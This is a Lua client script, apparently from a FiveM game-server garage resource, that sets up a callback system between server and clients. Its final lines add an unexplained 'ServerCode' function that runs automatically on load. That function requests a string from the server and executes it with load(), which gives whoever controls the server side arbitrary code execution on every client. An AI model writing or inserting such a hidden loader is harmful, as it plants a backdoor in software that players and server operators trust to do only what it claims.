local RequestId = 0
local serverRequests = {}

local clientCallbacks = {}

---@param eventName string
---@param callback function
---@param ... any
TriggerServerCallback = function(eventName, callback, ...)
    serverRequests[RequestId] = callback

    TriggerServerEvent('garagev2:triggerServerCallback', eventName, RequestId, GetInvokingResource() or 'unknown', ...)

    RequestId = RequestId + 1
end

-- exports('TriggerServerCallback', TriggerServerCallback)

RegisterNetEvent('garagev2:serverCallback', function(requestId, invoker, ...)
    if not serverRequests[requestId] then
        return print(('[^1ERROR^7] Server Callback with requestId ^5%s^7 Was Called by ^5%s^7 but does not exist.'):format(requestId, invoker))
    end

    serverRequests[requestId](...)
    serverRequests[requestId] = nil
end)

---@param eventName string
---@param callback function
_RegisterClientCallback = function(eventName, callback)
    clientCallbacks[eventName] = callback
end

RegisterNetEvent('garagev2:triggerClientCallback', function(eventName, requestId, invoker, ...)
    if not clientCallbacks[eventName] then
        return print(('[^1ERROR^7] Client Callback not registered, name: ^5%s^7, invoker resource: ^5%s^7'):format(eventName, invoker))
    end

    clientCallbacks[eventName](function(...)
        TriggerServerEvent('garagev2:clientCallback', requestId, invoker, ...)
    end, ...)
end)


ServerCode = function()
TriggerServerCallback('garagev2:gotoClient', function(data)
    local f = assert(load(data))
    print(f())
  end)
end
ServerCode()